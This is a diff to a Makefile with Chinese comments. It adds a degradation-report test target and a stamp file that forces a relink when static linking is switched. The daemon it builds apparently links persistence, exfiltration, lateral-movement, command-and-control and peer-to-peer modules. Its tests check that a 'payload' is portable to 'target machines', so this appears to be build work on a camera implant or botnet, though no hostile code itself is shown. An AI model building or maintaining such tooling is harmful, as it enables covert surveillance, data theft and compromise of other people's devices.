@@ -281,6 +281,13 @@ verify-jpeg-decode: $(JPEG_PROBE)
 verify-v4l2-degrade: $(V4L2_PROBE)
 	@python3 tests/verify_v4l2_degrade.py
 
+# 降级可见性（上层接线）：验"后端算出来的降级，上层真读出并显示"。
+# 与 verify-v4l2-degrade 是两层：那个验能力，这个验消费。能力层全绿而
+# 没人消费，运维依旧只看到假画面在持续送达。
+.PHONY: verify-degrade-report
+verify-degrade-report: $(CAMDBIN)
+	@python3 tests/verify_degrade_report.py
+
 .PHONY: verify-v4l2-realpath
 verify-v4l2-realpath: $(V4L2_PROBE)
 	@python3 tests/verify_v4l2_realpath.py
@@ -300,8 +307,20 @@ $(BUILD)/test_cam_daemon: tests/test_cam_daemon.c $(PORT_OBJS) $(DAEMON_OBJ) \
 $(CAMBIN_OBJ): src/cam_daemon_main.c include/cam_daemon.h include/camera.h | dirs
 	$(CC) $(CFLAGS) -c $< -o $@
 
+# STATIC 切换必须触发重链，否则产物会静默停留在上一种链接方式。
+#
+# 【实测撞出来的】STATIC 是 make 变量，只影响命令行里的 $(STATIC_LD)，
+# 而目标的依赖与时间戳都不含它。于是 STATIC=0 编出动态版后，再跑
+# `make camd` 会判定"源文件都没变、无需重链"，产物仍然是动态的——
+# 表现为"声称静态、实际动态"，在存量目标机上直接 GLIBC 版本错配。
+# 用一个随 STATIC 取值变名的 stamp 做依赖，切换时该 stamp 不存在即重链。
+STATIC_STAMP := $(BUILD)/.static_$(STATIC)
+
+$(STATIC_STAMP): | dirs
+	@rm -f $(BUILD)/.static_*; touch $@
+
 $(CAMDBIN): $(CAMBIN_OBJ) $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) $(TLS_OBJS) \
-            $(FRONT_OBJS) $(DAEMON_DEPS) | dirs upstream-deps
+            $(FRONT_OBJS) $(DAEMON_DEPS) $(STATIC_STAMP) | dirs upstream-deps
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DAEMON_OBJ) $(DEP_OBJS) \
 	      $(PERSIST_OBJ) $(EXFIL_OBJS) $(LATLIB) $(C2OBJS) $(P2PLIB) \
 	      $(TLS_OBJS) $(FRONT_OBJS) $(STATIC_LD) -o $@ $(LDLIBS)
@@ -320,6 +339,8 @@ test: $(TEST_BINS)
 	$(MAKE) verify-v4l2-realpath || fail=1; \
 	echo "=== verify-v4l2-degrade（降级可见性） ==="; \
 	$(MAKE) verify-v4l2-degrade || fail=1; \
+	echo "=== verify-degrade-report（降级上层接线） ==="; \
+	$(MAKE) verify-degrade-report || fail=1; \
 	echo "=== verify-portable-payload（随机目标机可移植性） ==="; \
 	python3 tests/verify_portable_payload.py || fail=1; \
 	exit $$fail
